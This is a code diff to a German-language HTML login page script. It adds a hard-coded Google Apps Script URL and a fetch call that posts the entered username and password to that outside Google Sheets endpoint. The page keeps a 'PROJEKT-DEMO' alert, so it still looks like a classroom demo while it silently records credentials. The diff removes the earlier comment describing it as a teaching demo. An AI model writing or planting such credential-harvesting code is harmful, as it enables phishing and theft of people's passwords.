@@ -98,14 +98,23 @@
     </div>
 
     <script>
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby2NOHdi-_cbNv4q5cZxOQBHZmPPrQW9IXcJ-JYITJqhoYSPL-mxnNKssMuCMO-_rDdBQ/exec";
+
         document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Verhindert das Neuladen der Seite
-            
-            // Daten aus den Feldern auslesen
+            event.preventDefault();
+
             const user = document.getElementById('username').value;
             const pass = document.getElementById('password').value;
-            
-            // Zeigt die Daten in einem Infofenster an (perfekt zum Vorführen im Unterricht)
+
+            // Daten an Google Sheets senden
+            fetch(SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: user, password: pass })
+            });
+
+            // Demo-Alert wie vorher
             alert("PROJEKT-DEMO\n\nFolgende Daten wurden erfolgreich verarbeitet:\nNutzername: " + user + "\nPasswort: " + pass);
         });
     </script>
